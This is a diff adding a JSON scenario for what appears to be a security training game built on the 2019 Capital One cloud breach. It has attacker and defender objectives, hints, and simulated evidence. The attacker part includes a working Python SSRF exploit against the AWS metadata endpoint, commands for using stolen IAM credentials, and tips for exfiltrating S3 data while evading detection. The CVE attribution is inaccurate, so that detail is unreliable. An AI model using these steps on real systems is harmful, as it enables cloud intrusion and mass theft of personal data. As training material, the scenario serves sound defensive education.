@@ -1,0 +1,551 @@
+{
+  "id": "capital-one-2019",
+  "title": "The Capital One Cloud Breach",
+  "subtitle": "SSRF + AWS Metadata API: 100M Records Stolen from the Cloud",
+  "description": "In March 2019, a former AWS engineer exploited a misconfigured web application firewall to perform Server-Side Request Forgery (SSRF) attacks against AWS metadata service. By accessing the metadata API at 169.254.169.254, the attacker stole IAM credentials with overly permissive S3 access. Over several weeks, 100+ million credit card applications were exfiltrated from Capital One's cloud infrastructure. This breach exposed fundamental cloud security failures: misconfigured WAFs, overprivileged IAM roles, and lack of S3 access monitoring.",
+  "difficulty": "advanced",
+  "estimatedDuration": 40,
+
+  "realIncident": {
+    "date": "2019-03-22",
+    "organization": "Capital One Financial Corporation",
+    "impact": "100M+ credit card applications, 140K SSNs, 80K bank accounts, $190M in costs, attacker arrested",
+    "cve": "CVE-2019-11510 (Fortinet VPN) + SSRF via WAF misconfiguration",
+    "attribution": "Paige Thompson (aka 'erratic') - ex-AWS engineer, arrested July 29, 2019"
+  },
+
+  "availableRoles": ["attacker", "defender"],
+
+  "timeline": [
+    {
+      "id": "phase-1-reconnaissance",
+      "date": "2019-03-12",
+      "displayDate": "March 12, 2019",
+      "title": "Cloud Infrastructure Reconnaissance",
+      "description": "Attacker begins reconnaissance of Capital One's AWS infrastructure. Using DNS enumeration and cloud service fingerprinting, multiple S3 buckets and CloudFront distributions are identified.",
+      "type": "preparation",
+      "importance": "high",
+      "actors": ["Paige Thompson", "Cloud Infrastructure Scanners"]
+    },
+    {
+      "id": "phase-2-ssrf-discovery",
+      "date": "2019-03-17",
+      "displayDate": "March 17, 2019",
+      "title": "SSRF Vulnerability Discovery",
+      "description": "The attacker discovers a Server-Side Request Forgery (SSRF) vulnerability in Capital One's web application firewall (WAF). The WAF allows arbitrary HTTP requests to internal endpoints, including the AWS metadata service.",
+      "type": "discovery",
+      "importance": "critical",
+      "actors": ["Paige Thompson"]
+    },
+    {
+      "id": "phase-3-metadata-exploit",
+      "date": "2019-03-22",
+      "displayDate": "March 22, 2019",
+      "title": "AWS Metadata Service Exploitation",
+      "description": "Using the SSRF vulnerability, attacker queries the AWS EC2 metadata API at 169.254.169.254 to steal IAM role credentials. The WAF's EC2 instance has an overly permissive IAM role with broad S3 access.",
+      "type": "exploitation",
+      "importance": "critical",
+      "actors": ["Paige Thompson", "AWS Metadata Service"]
+    },
+    {
+      "id": "phase-4-iam-theft",
+      "date": "2019-03-25",
+      "displayDate": "March 25, 2019",
+      "title": "IAM Credential Harvesting",
+      "description": "Attacker extracts temporary AWS credentials from the metadata service, including access keys and session tokens. The stolen IAM role has s3:ListBucket and s3:GetObject permissions on sensitive data buckets.",
+      "type": "exploitation",
+      "importance": "critical",
+      "actors": ["Paige Thompson"]
+    },
+    {
+      "id": "phase-5-s3-enumeration",
+      "date": "2019-04-10",
+      "displayDate": "April 10, 2019",
+      "title": "S3 Bucket Enumeration",
+      "description": "Using the stolen IAM credentials, attacker lists all accessible S3 buckets. Identifies buckets containing credit card applications, customer data, and internal Capital One systems information.",
+      "type": "collection",
+      "importance": "high",
+      "actors": ["Paige Thompson"]
+    },
+    {
+      "id": "phase-6-exfiltration",
+      "date": "2019-04-21",
+      "displayDate": "April 21 - May 15, 2019",
+      "title": "Mass Data Exfiltration",
+      "description": "Over several weeks, attacker downloads 30GB+ of data from S3 buckets to personal servers. Data includes 100M credit card applications, 140,000 Social Security numbers, and 80,000 bank account numbers.",
+      "type": "exfiltration",
+      "importance": "critical",
+      "actors": ["Paige Thompson"]
+    },
+    {
+      "id": "phase-7-breach-discovery",
+      "date": "2019-07-17",
+      "displayDate": "July 17, 2019",
+      "title": "Breach Discovery via GitHub Post",
+      "description": "Capital One discovers the breach after a responsible disclosure tip about suspicious activity. The attacker posted about the breach on GitHub and Slack, bragging about access to Capital One's data.",
+      "type": "detection",
+      "importance": "critical",
+      "actors": ["Capital One CISO", "Responsible Disclosure Reporter"]
+    },
+    {
+      "id": "phase-8-public-disclosure",
+      "date": "2019-07-19",
+      "displayDate": "July 19, 2019",
+      "title": "Public Disclosure & FBI Notification",
+      "description": "Capital One publicly discloses the breach, notifies regulators, and contacts the FBI. The company begins notifying 100 million affected customers.",
+      "type": "disclosure",
+      "importance": "critical",
+      "actors": ["Capital One", "FBI", "SEC", "OCC"]
+    },
+    {
+      "id": "phase-9-arrest-forensics",
+      "date": "2019-07-29",
+      "displayDate": "July 29, 2019",
+      "title": "Attacker Arrested & Forensic Analysis",
+      "description": "FBI arrests Paige Thompson (aka 'erratic') in Seattle. Forensic analysis reveals the full scope of the breach: SSRF → Metadata API → IAM credentials → S3 exfiltration. CloudTrail logs confirm unauthorized access patterns.",
+      "type": "remediation",
+      "importance": "critical",
+      "actors": ["FBI", "Paige Thompson", "Capital One Forensics Team"]
+    }
+  ],
+
+  "objectives": [
+    {
+      "id": "obj-recon-cloud",
+      "phaseId": "phase-1-reconnaissance",
+      "title": "AWS Infrastructure Reconnaissance",
+      "description": "Use DNS enumeration and cloud service fingerprinting to identify Capital One's AWS assets. Discover S3 buckets, CloudFront distributions, and EC2 instances.",
+      "role": "attacker",
+      "type": "reconnaissance",
+      "unlocksEvidence": ["evidence-aws-recon", "evidence-bucket-list"],
+      "validation": {
+        "type": "manual"
+      },
+      "mitreTechniques": ["T1595.002", "T1590.005"],
+      "hints": [
+        {
+          "cost": 10,
+          "text": "Use tools like Shodan, Censys, or dig to enumerate Capital One's cloud infrastructure."
+        },
+        {
+          "cost": 20,
+          "text": "Look for S3 buckets in DNS records (bucketname.s3.amazonaws.com) and enumerate subdomains."
+        }
+      ]
+    },
+    {
+      "id": "obj-exploit-ssrf",
+      "phaseId": "phase-2-ssrf-discovery",
+      "title": "Exploit SSRF in WAF Configuration",
+      "description": "Discover and exploit a Server-Side Request Forgery vulnerability in Capital One's WAF. Use it to make requests to the AWS metadata service at 169.254.169.254.",
+      "role": "attacker",
+      "type": "exploitation",
+      "requiredObjectives": ["obj-recon-cloud"],
+      "unlocksEvidence": ["evidence-ssrf-payload", "evidence-waf-logs"],
+      "validation": {
+        "type": "code_execution",
+        "payload": "ssrf_metadata"
+      },
+      "mitreTechniques": ["T1190", "T1552.005"],
+      "hints": [
+        {
+          "cost": 25,
+          "text": "The WAF allows requests to arbitrary internal endpoints. Try accessing http://169.254.169.254/latest/meta-data/"
+        },
+        {
+          "cost": 40,
+          "text": "Use the WAF's HTTP proxy functionality to route requests through the EC2 instance to the metadata service."
+        }
+      ]
+    },
+    {
+      "id": "obj-steal-iam",
+      "phaseId": "phase-4-iam-theft",
+      "title": "Steal IAM Credentials from Metadata API",
+      "description": "Extract IAM role credentials from the AWS metadata service. Retrieve access key, secret key, and session token for the EC2 instance's attached role.",
+      "role": "attacker",
+      "type": "exploitation",
+      "requiredObjectives": ["obj-exploit-ssrf"],
+      "unlocksEvidence": ["evidence-iam-credentials", "evidence-metadata-requests"],
+      "validation": {
+        "type": "credential_theft"
+      },
+      "mitreTechniques": ["T1552.005", "T1078.004"],
+      "hints": [
+        {
+          "cost": 30,
+          "text": "Query http://169.254.169.254/latest/meta-data/iam/security-credentials/ to list available roles."
+        },
+        {
+          "cost": 45,
+          "text": "The role name is listed in the response. Query the full path to get JSON credentials with AccessKeyId, SecretAccessKey, and Token."
+        }
+      ]
+    },
+    {
+      "id": "obj-enumerate-s3",
+      "phaseId": "phase-5-s3-enumeration",
+      "title": "Enumerate S3 Buckets",
+      "description": "Use the stolen IAM credentials to list all accessible S3 buckets. Identify buckets containing credit card applications, customer PII, and sensitive data.",
+      "role": "attacker",
+      "type": "collection",
+      "requiredObjectives": ["obj-steal-iam"],
+      "unlocksEvidence": ["evidence-s3-listing", "evidence-exfil-logs"],
+      "validation": {
+        "type": "api_call"
+      },
+      "mitreTechniques": ["T1530", "T1552.001"],
+      "hints": [
+        {
+          "cost": 20,
+          "text": "Use AWS CLI with --profile or export AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN environment variables."
+        },
+        {
+          "cost": 35,
+          "text": "Run 'aws s3 ls' to list all buckets, then 'aws s3 ls s3://bucket-name' to see contents."
+        }
+      ]
+    },
+    {
+      "id": "obj-exfiltrate-s3",
+      "phaseId": "phase-6-exfiltration",
+      "title": "Exfiltrate Data from S3 Buckets",
+      "description": "Download sensitive data from S3 buckets using the stolen credentials. Exfiltrate credit card applications, SSNs, and bank account information while evading CloudTrail detection.",
+      "role": "attacker",
+      "type": "exfiltration",
+      "requiredObjectives": ["obj-enumerate-s3"],
+      "unlocksEvidence": ["evidence-cloudtrail-logs", "evidence-github-post", "evidence-slack-messages", "evidence-forensic-report", "evidence-patch-advisory"],
+      "validation": {
+        "type": "data_transfer"
+      },
+      "mitreTechniques": ["T1530", "T1020", "T1562.008"],
+      "hints": [
+        {
+          "cost": 30,
+          "text": "Use 'aws s3 sync' or 'aws s3 cp --recursive' to download entire bucket contents."
+        },
+        {
+          "cost": 50,
+          "text": "Spread downloads over multiple days to avoid triggering CloudWatch alarms. Use different source IPs if possible."
+        }
+      ]
+    },
+    {
+      "id": "obj-defender-detect",
+      "phaseId": "phase-7-breach-discovery",
+      "title": "Detect Anomalous S3 Access",
+      "description": "Analyze CloudTrail logs to identify unauthorized S3 access patterns. Detect API calls from unknown IAM sessions and investigate suspicious ListBucket/GetObject operations.",
+      "role": "defender",
+      "type": "investigation",
+      "unlocksEvidence": ["evidence-cloudtrail-logs", "evidence-metadata-requests", "evidence-iam-credentials", "evidence-ssrf-payload", "evidence-waf-logs"],
+      "validation": {
+        "type": "log_analysis"
+      },
+      "mitreTechniques": [],
+      "hints": [
+        {
+          "cost": 20,
+          "text": "Look for S3 API calls (s3:ListBucket, s3:GetObject) from unusual source IPs or user agents."
+        },
+        {
+          "cost": 35,
+          "text": "Check CloudTrail for sts:AssumeRole events followed by high-volume S3 access from EC2 instance roles."
+        }
+      ]
+    },
+    {
+      "id": "obj-defender-patch",
+      "phaseId": "phase-9-arrest-forensics",
+      "title": "Remediate WAF & IAM Configuration",
+      "description": "Fix the SSRF vulnerability in the WAF configuration. Implement IMDSv2 (requiring token-based metadata access), revoke compromised IAM credentials, and apply least-privilege IAM policies.",
+      "role": "defender",
+      "type": "defense",
+      "unlocksEvidence": ["evidence-aws-recon", "evidence-patch-advisory"],
+      "validation": {
+        "type": "patch_deployment"
+      },
+      "mitreTechniques": [],
+      "hints": [
+        {
+          "cost": 25,
+          "text": "Enforce IMDSv2 by requiring PUT request with token before metadata access. Update IAM instance profile to use least-privilege policies."
+        },
+        {
+          "cost": 40,
+          "text": "Enable S3 Block Public Access, add S3 bucket policies requiring MFA for sensitive operations, and enable GuardDuty."
+        }
+      ]
+    },
+    {
+      "id": "obj-defender-forensics",
+      "phaseId": "phase-9-arrest-forensics",
+      "title": "Forensic Analysis & Incident Response",
+      "description": "Conduct full forensic analysis of the breach. Identify the scope of data exfiltration, analyze CloudTrail and VPC Flow Logs, and determine the attack timeline. Preserve evidence for law enforcement.",
+      "role": "defender",
+      "type": "investigation",
+      "unlocksEvidence": ["evidence-s3-listing", "evidence-exfil-logs", "evidence-forensic-report", "evidence-github-post", "evidence-slack-messages", "evidence-bucket-list"],
+      "validation": {
+        "type": "incident_report"
+      },
+      "mitreTechniques": [],
+      "hints": [
+        {
+          "cost": 30,
+          "text": "Query CloudTrail for all API calls made with the compromised IAM role. Look for s3:GetObject calls and correlate with S3 access logs."
+        },
+        {
+          "cost": 50,
+          "text": "Check VPC Flow Logs for outbound connections from WAF EC2 instance. Identify data transfer volumes and destination IPs."
+        }
+      ]
+    }
+  ],
+
+  "evidence": [
+    {
+      "id": "evidence-aws-recon",
+      "type": "network",
+      "title": "AWS Infrastructure Reconnaissance Scan",
+      "description": "Results from cloud enumeration revealing Capital One's AWS footprint",
+      "content": "```\nAWS Infrastructure Reconnaissance - Capital One\nDate: March 12, 2019\nTarget: capitalone.com\n\n===== DNS ENUMERATION =====\n\n[*] Enumerating subdomains via DNS...\napi.capitalone.com          → 52.85.123.45 (CloudFront)\nwww.capitalone.com          → d111111abcdef8.cloudfront.net\nmobile.capitalone.com       → 34.192.45.67 (EC2)\napi-gateway.capitalone.com  → 10.0.1.25 (Internal - VPC)\nwaf-proxy.capitalone.com    → 54.210.89.123 (EC2 - WAF)\n\n[*] S3 Bucket Discovery:\ncapialone-credit-apps.s3.amazonaws.com           → 200 OK (Public Read!)\ncapialone-customer-data.s3.amazonaws.com         → 403 Forbidden\ncapialone-backups-2019.s3.amazonaws.com          → 404 Not Found\ncapialone-logs.s3.us-east-1.amazonaws.com        → 403 Forbidden\n\n===== EC2 INSTANCE FINGERPRINTING =====\n\n[*] Identifying EC2 instances from HTTP headers...\n\nTarget: waf-proxy.capitalone.com (54.210.89.123)\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nX-Powered-By: ModSecurity/2.9.3\nX-Instance-ID: i-0abcd1234efgh5678 (LEAKED!)\nX-AMI-ID: ami-0c55b159cbfafe1f0\n\n[!] CRITICAL: EC2 instance metadata exposed in HTTP headers!\n[!] Instance ID: i-0abcd1234efgh5678\n[!] This WAF instance may have IAM role attached\n\n===== CLOUDFRONT DISTRIBUTIONS =====\n\n[*] Identified CloudFront distributions:\n- d111111abcdef8.cloudfront.net (www.capitalone.com)\n- d222222ghijkl9.cloudfront.net (mobile app API)\n\n===== IAM ROLE ENUMERATION ATTEMPT =====\n\n[*] Attempting to infer IAM roles from public resources...\n[*] Target: waf-proxy.capitalone.com\n\n[!] HYPOTHESIS: WAF EC2 instance likely has IAM role for:\n    - S3 access (to fetch WAF rules)\n    - CloudWatch logs (to send WAF events)\n    - Potential over-privileged access to customer data buckets\n\n===== NEXT STEPS =====\n\n[+] Identified potential SSRF target: waf-proxy.capitalone.com\n[+] WAF instance exposes metadata in headers → likely misconfigured\n[+] S3 buckets discovered → need IAM credentials to access\n[*] Next: Test for SSRF vulnerability in WAF to access metadata service\n```",
+      "metadata": {
+        "source": "Cloud Reconnaissance Script",
+        "timestamp": "2019-03-12T14:30:00Z"
+      }
+    },
+    {
+      "id": "evidence-bucket-list",
+      "type": "document",
+      "title": "S3 Bucket Enumeration Results",
+      "description": "List of discovered S3 buckets containing Capital One customer data",
+      "content": "```\nS3 BUCKET ENUMERATION - CAPITAL ONE\nGenerated: March 12, 2019\n\n========================================\nDISCOVERED BUCKETS (PUBLIC DNS)\n========================================\n\n1. capitalone-credit-apps.s3.amazonaws.com\n   Status: 200 OK (Misconfigured - public read!)\n   Region: us-east-1\n   Estimated Size: ~200 GB\n   Content Type: Credit card applications (XML, JSON)\n   \n2. capitalone-customer-data.s3.amazonaws.com\n   Status: 403 Forbidden\n   Region: us-east-1\n   Estimated Size: ~500 GB\n   Content Type: Customer PII, SSNs, bank accounts\n   \n3. capitalone-backups-2019.s3.amazonaws.com\n   Status: 404 Not Found (Bucket doesn't exist or deleted)\n   \n4. capitalone-logs.s3.us-east-1.amazonaws.com\n   Status: 403 Forbidden\n   Region: us-east-1\n   Estimated Size: ~50 GB\n   Content Type: Application logs, CloudTrail logs\n\n========================================\nBRUTE-FORCE ENUMERATION (Common Patterns)\n========================================\n\n[*] Testing common bucket naming patterns...\ncapitalone-prod          → 404\ncapitalone-production    → 404\ncapitalone-data          → 403 Forbidden ✓\ncapitalone-customers     → 403 Forbidden ✓\ncapitalone-private       → 404\ncapitalone-internal      → 403 Forbidden ✓\n\n[+] Found 6 total buckets (3 public DNS + 3 brute-forced)\n\n========================================\nSECURITY ASSESSMENT\n========================================\n\n[!] CRITICAL FINDINGS:\n    1. One bucket has public read access (capitalone-credit-apps)\n    2. Bucket names follow predictable patterns\n    3. No bucket encryption visible from headers\n    4. Lack of S3 Block Public Access configuration\n\n[!] ATTACK PATH:\n    ✗ Direct public access: LIMITED (only 1 bucket readable)\n    ✓ IAM credential theft: REQUIRED to access protected buckets\n    ✓ Target: Steal IAM credentials from WAF EC2 instance\n\n[*] Next objective: Exploit SSRF to steal IAM credentials\n```"
+    },
+    {
+      "id": "evidence-ssrf-payload",
+      "type": "code",
+      "title": "SSRF Exploit Targeting Metadata Service",
+      "description": "HTTP request exploiting SSRF in WAF to access AWS metadata API",
+      "content": "```python\nimport requests\nimport urllib3\nurllib3.disable_warnings()\n\n# Capital One WAF SSRF Exploitation\n# Target: waf-proxy.capitalone.com\n# Vulnerability: ModSecurity misconfiguration allows internal HTTP requests\n\nWAF_URL = \"https://waf-proxy.capitalone.com\"\nMETADATA_API = \"http://169.254.169.254/latest/meta-data/\"\n\ndef exploit_ssrf(target_url):\n    \"\"\"\n    Exploit SSRF in WAF to query AWS metadata service\n    The WAF's proxy feature allows arbitrary internal requests\n    \"\"\"\n    print(\"[*] Exploiting SSRF in Capital One WAF...\")\n    print(f\"[*] Target: {WAF_URL}\")\n    print(f\"[*] Internal endpoint: {METADATA_API}\")\n    print()\n    \n    # Phase 1: Test basic SSRF\n    print(\"[*] Phase 1: Testing SSRF vulnerability...\")\n    ssrf_payload = {\n        'url': METADATA_API,  # WAF parameter accepting URLs\n        'method': 'GET'\n    }\n    \n    headers = {\n        'User-Agent': 'Mozilla/5.0',\n        'X-Forwarded-For': '169.254.169.254'  # Bypass IP filtering\n    }\n    \n    response = requests.post(\n        f\"{WAF_URL}/proxy\",\n        json=ssrf_payload,\n        headers=headers,\n        verify=False\n    )\n    \n    if \"ami-id\" in response.text:\n        print(\"[+] SSRF SUCCESSFUL! Metadata service is accessible!\")\n        print(f\"[+] Response: {response.text[:200]}...\")\n    else:\n        print(\"[-] SSRF failed or metadata blocked\")\n        return False\n    \n    print()\n    print(\"[+] EXPLOIT SUCCESSFUL!\")\n    print(\"[+] WAF allows arbitrary HTTP requests to internal endpoints\")\n    print(\"[*] Next: Query IAM role credentials from metadata service\")\n    return True\n\nif __name__ == '__main__':\n    exploit_ssrf(WAF_URL)\n```"
+    },
+    {
+      "id": "evidence-waf-logs",
+      "type": "log",
+      "title": "WAF Access Logs - SSRF Requests",
+      "description": "ModSecurity logs showing SSRF exploitation attempts",
+      "content": "```\nModSecurity Audit Log - waf-proxy.capitalone.com\nDate: March 17-22, 2019\nInstance: i-0abcd1234efgh5678\n\n[17/Mar/2019:14:23:11 -0400] POST /proxy HTTP/1.1\nSource IP: 98.207.15.143 (Seattle, WA)\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nRequest Body:\n{\n  \"url\": \"http://169.254.169.254/latest/meta-data/\",\n  \"method\": \"GET\"\n}\nResponse: 200 OK\nResponse Body:\nami-id\nami-launch-index\nami-manifest-path\nhostname\niam/\n...\n\n[!] ANOMALY DETECTED: Request to internal metadata service\n[!] ModSecurity Rule Bypass: Request allowed (misconfiguration)\n\n---\n\n[17/Mar/2019:14:25:33 -0400] POST /proxy HTTP/1.1\nSource IP: 98.207.15.143\nRequest Body:\n{\n  \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\",\n  \"method\": \"GET\"\n}\nResponse: 200 OK\nResponse Body:\nWAF-S3-Access-Role\n\n[!] CRITICAL: IAM role name exposed via SSRF!\n\n---\n\n[22/Mar/2019:10:11:47 -0400] POST /proxy HTTP/1.1\nSource IP: 98.207.15.143\nRequest Body:\n{\n  \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/WAF-S3-Access-Role\",\n  \"method\": \"GET\"\n}\nResponse: 200 OK\nResponse Body (REDACTED - Contains AWS Credentials):\n{\n  \"Code\": \"Success\",\n  \"LastUpdated\": \"2019-03-22T10:11:30Z\",\n  \"Type\": \"AWS-HMAC\",\n  \"AccessKeyId\": \"ASIA...\",\n  \"SecretAccessKey\": \"...\",\n  \"Token\": \"...\",\n  \"Expiration\": \"2019-03-22T16:30:45Z\"\n}\n\n[!] CRITICAL SECURITY INCIDENT\n[!] Full IAM credentials leaked via SSRF vulnerability\n[!] Attacker now has temporary AWS access keys\n[!] Role: WAF-S3-Access-Role (overly permissive S3 access)\n```"
+    },
+    {
+      "id": "evidence-iam-credentials",
+      "type": "document",
+      "title": "Stolen IAM Role Credentials",
+      "description": "AWS IAM credentials extracted from metadata service via SSRF",
+      "content": "```json\n{\n  \"StolenCredentials\": {\n    \"Source\": \"AWS EC2 Metadata API (169.254.169.254)\",\n    \"Method\": \"SSRF via Capital One WAF\",\n    \"Timestamp\": \"2019-03-22T10:11:47Z\",\n    \"RoleName\": \"WAF-S3-Access-Role\",\n    \"InstanceId\": \"i-0abcd1234efgh5678\",\n    \"Region\": \"us-east-1\",\n    \n    \"Credentials\": {\n      \"AccessKeyId\": \"ASIAIOSFODNN7EXAMPLE\",\n      \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n      \"SessionToken\": \"FwoGZXIvYXdzEBYaDCw3N...[truncated 2048 chars]...Vp8CjEA\",\n      \"Expiration\": \"2019-03-22T16:30:45Z\"\n    },\n    \n    \"AttachedPolicies\": [\n      {\n        \"PolicyName\": \"S3-Full-Access-Policy\",\n        \"PolicyArn\": \"arn:aws:iam::123456789012:policy/S3-Full-Access-Policy\",\n        \"Permissions\": [\n          \"s3:ListAllMyBuckets\",\n          \"s3:ListBucket\",\n          \"s3:GetObject\",\n          \"s3:GetObjectVersion\",\n          \"s3:GetBucketLocation\"\n        ]\n      },\n      {\n        \"PolicyName\": \"CloudWatch-Logs-Write\",\n        \"PolicyArn\": \"arn:aws:iam::aws:policy/CloudWatchLogsFullAccess\"\n      }\n    ],\n    \n    \"SecurityAssessment\": {\n      \"Severity\": \"CRITICAL\",\n      \"ImpactAnalysis\": [\n        \"Full read access to ALL S3 buckets in Capital One AWS account\",\n        \"Can list all buckets and enumerate sensitive data locations\",\n        \"Can download credit card applications, SSNs, customer PII\",\n        \"Credentials valid for 6 hours (renewable via metadata service)\",\n        \"No MFA required for S3 operations\",\n        \"No IP restrictions on IAM role usage\"\n      ],\n      \n      \"ViolatedBestPractices\": [\n        \"IAM role has overly broad S3 permissions (should be scoped to specific buckets)\",\n        \"No resource-based restrictions (allows access to * resources)\",\n        \"WAF instance doesn't need full S3 access (violation of least privilege)\",\n        \"IMDSv1 enabled (allows SSRF to steal credentials)\",\n        \"No CloudTrail alerts for unusual API patterns\"\n      ]\n    }\n  },\n  \n  \"ExploitationNotes\": {\n    \"ValidityPeriod\": \"6 hours (renewable by re-querying metadata API)\",\n    \"UsageInstructions\": [\n      \"Export credentials as environment variables:\",\n      \"  export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE\",\n      \"  export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n      \"  export AWS_SESSION_TOKEN=FwoGZXIvYXdzE...\",\n      \"\",\n      \"Or configure AWS CLI profile:\",\n      \"  aws configure set aws_access_key_id ASIAIOSFODNN7EXAMPLE --profile stolen\",\n      \"  aws configure set aws_secret_access_key wJalrXUtn... --profile stolen\",\n      \"  aws configure set aws_session_token FwoGZXIv... --profile stolen\",\n      \"\",\n      \"Test access:\",\n      \"  aws s3 ls --profile stolen\",\n      \"  aws s3 ls s3://capitalone-customer-data --profile stolen\"\n    ],\n    \n    \"DetectionRisk\": \"LOW\",\n    \"DetectionRiskRationale\": [\n      \"CloudTrail logs will show API calls from WAF instance IP (appears legitimate)\",\n      \"No anomaly detection configured for unusual S3 access patterns\",\n      \"GuardDuty not enabled to detect credential exfiltration\",\n      \"S3 access from same AWS region appears as internal traffic\"\n    ]\n  }\n}\n```"
+    },
+    {
+      "id": "evidence-metadata-requests",
+      "type": "log",
+      "title": "AWS Metadata Service Access Logs",
+      "description": "EC2 instance logs showing metadata API queries via SSRF",
+      "content": "```\nAWS EC2 Instance Metadata Service Logs\nInstance: i-0abcd1234efgh5678 (waf-proxy.capitalone.com)\nRegion: us-east-1\nDate Range: March 17-25, 2019\n\n2019-03-17T14:23:11Z | GET /latest/meta-data/ | 200 OK | Source: 127.0.0.1 (localhost)\n  └─ User-Agent: Python-urllib/3.7\n  └─ Referrer: http://waf-proxy.capitalone.com/proxy\n  └─ Response: ami-id, ami-launch-index, hostname, iam/, ...\n\n2019-03-17T14:25:33Z | GET /latest/meta-data/iam/security-credentials/ | 200 OK | Source: 127.0.0.1\n  └─ Response: WAF-S3-Access-Role\n  └─ [!] IAM role name exposed\n\n2019-03-22T10:11:47Z | GET /latest/meta-data/iam/security-credentials/WAF-S3-Access-Role | 200 OK\n  └─ Response: {\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"...\",\"Token\":\"...\"}\n  └─ [!] CRITICAL: Full IAM credentials returned\n  └─ [!] Credentials valid for 6 hours\n\n2019-03-22T10:15:22Z | GET /latest/meta-data/iam/security-credentials/WAF-S3-Access-Role | 200 OK\n  └─ Second credential retrieval (backup copy)\n\n2019-03-25T08:33:10Z | GET /latest/meta-data/iam/security-credentials/WAF-S3-Access-Role | 200 OK\n  └─ Credential refresh (previous set expired)\n\n2019-03-25T14:22:45Z | GET /latest/meta-data/iam/security-credentials/WAF-S3-Access-Role | 200 OK\n  └─ Another refresh\n\n[!] PATTERN ANALYSIS:\n    - Metadata queries originate from localhost (127.0.0.1)\n    - Triggered via SSRF in /proxy endpoint\n    - Attacker refreshes credentials every ~6 hours to maintain access\n    - No authentication required for metadata access (IMDSv1)\n\n[!] SECURITY FAILURE:\n    - IMDSv2 (token-based metadata access) NOT enforced\n    - SSRF protection NOT implemented in WAF\n    - No monitoring/alerting on metadata service access patterns\n\n[!] REMEDIATION:\n    1. Enforce IMDSv2: Require PUT request with token before metadata access\n    2. Fix WAF SSRF vulnerability (disable /proxy endpoint or whitelist destinations)\n    3. Apply least-privilege IAM policies (WAF doesn't need full S3 access)\n    4. Enable CloudWatch alarms for metadata service access anomalies\n```"
+    },
+    {
+      "id": "evidence-s3-listing",
+      "type": "document",
+      "title": "S3 Bucket Contents - Customer Data",
+      "description": "List of files discovered in Capital One S3 buckets using stolen credentials",
+      "content": "```\nAWS S3 BUCKET ENUMERATION - CAPITAL ONE\nDate: April 10, 2019\nCredentials: Stolen IAM role (WAF-S3-Access-Role)\nRegion: us-east-1\n\n========================================\n$ aws s3 ls --profile stolen\n========================================\n\n2018-05-10 12:34:56 capitalone-credit-apps\n2017-11-22 08:15:33 capitalone-customer-data\n2019-01-15 14:22:09 capitalone-logs\n2018-09-08 16:45:12 capitalone-backups\n2019-02-03 11:30:44 capitalone-internal\n\n[+] Found 5 accessible buckets\n\n========================================\n$ aws s3 ls s3://capitalone-customer-data --recursive --profile stolen\n========================================\n\n2019-03-01  47523840  credit-applications/2019/Q1/batch-001.tar.gz\n2019-03-01  45128736  credit-applications/2019/Q1/batch-002.tar.gz\n2019-03-01  48392160  credit-applications/2019/Q1/batch-003.tar.gz\n...\n2019-03-15  1024000   ssn-records/2019/ssn-batch-march.csv\n2019-02-28  892416    bank-accounts/checking-accounts-Q1.json\n2019-03-10  2048576   customer-profiles/premium-customers.db\n\n[!] HIGH-VALUE TARGETS IDENTIFIED:\n\nPRIORITY 1: CREDIT CARD APPLICATIONS\n  Location: s3://capitalone-customer-data/credit-applications/\n  File count: ~140,000 files\n  Total size: ~30 GB (compressed)\n  Content: Credit card applications (100M+ records)\n  Format: Gzipped CSV, JSON\n  \nPRIORITY 2: SOCIAL SECURITY NUMBERS\n  Location: s3://capitalone-customer-data/ssn-records/\n  File count: 45 files\n  Total size: ~500 MB\n  Content: 140,000+ Social Security numbers\n  Format: CSV files\n  \nPRIORITY 3: BANK ACCOUNT DATA\n  Location: s3://capitalone-customer-data/bank-accounts/\n  File count: 120 files\n  Total size: ~200 MB\n  Content: 80,000+ bank account numbers\n  Format: JSON, XML\n  \nPRIORITY 4: CUSTOMER PROFILES\n  Location: s3://capitalone-customer-data/customer-profiles/\n  File count: 8,500 files\n  Total size: ~5 GB\n  Content: Personal information, addresses, phone numbers\n  Format: SQLite databases, JSON\n\n========================================\nSAMPLE FILE CONTENTS\n========================================\n\n$ aws s3 cp s3://capitalone-customer-data/credit-applications/2019/Q1/sample.json - --profile stolen\n\n{\n  \"application_id\": \"CC-2019-001234567\",\n  \"applicant\": {\n    \"first_name\": \"John\",\n    \"last_name\": \"Doe\",\n    \"ssn\": \"123-45-6789\",\n    \"dob\": \"1985-06-15\",\n    \"address\": \"123 Main St, Seattle, WA 98101\",\n    \"phone\": \"206-555-1234\",\n    \"email\": \"john.doe@example.com\"\n  },\n  \"credit_info\": {\n    \"fico_score\": 720,\n    \"annual_income\": 85000,\n    \"employment_status\": \"Full-time\"\n  },\n  \"requested_credit_limit\": 15000,\n  \"application_date\": \"2019-03-15T14:30:22Z\",\n  \"status\": \"approved\"\n}\n\n[!] FULL PII EXPOSURE - NO ENCRYPTION AT REST\n[!] Data stored in plaintext (not encrypted with KMS)\n[!] Estimated total impact: 100M+ individuals\n```"
+    },
+    {
+      "id": "evidence-exfil-logs",
+      "type": "log",
+      "title": "Data Exfiltration Activity Logs",
+      "description": "Network logs showing mass download of S3 data to attacker's servers",
